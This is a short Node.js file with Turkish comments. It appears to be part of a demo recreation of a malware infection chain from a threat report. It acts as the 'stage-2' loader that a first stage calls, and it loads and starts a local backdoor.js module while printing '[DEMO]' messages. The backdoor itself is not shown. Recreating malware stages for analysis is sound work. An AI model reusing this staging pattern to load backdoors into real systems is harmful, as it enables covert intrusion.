"use strict";

/**
 * stage2-loader.js
 * ----------------
 * RAPORDAKİ KARŞILIĞI: %TEMP%\programx64\main.js
 * 
 * Bu dosya, Stage-1 tarafından çağrılır ve ana backdoor'u (backdoor.js)
 * belleğe yükler. Gerçek vakada bu dosya, kurbanın Temp klasörüne
 * indirilir ve çalıştırılırdı.
 */

console.log('[DEMO] Stage-2 loader çalıştı.');

try {
    // Ana backdoor'u yükle
    const backdoor = require('./backdoor.js');
    backdoor.start();
    console.log('[DEMO] Stage-2: backdoor.js başarıyla çalıştırıldı.');
} catch (err) {
    console.error('[DEMO] Stage-2 hata:', err.message);
}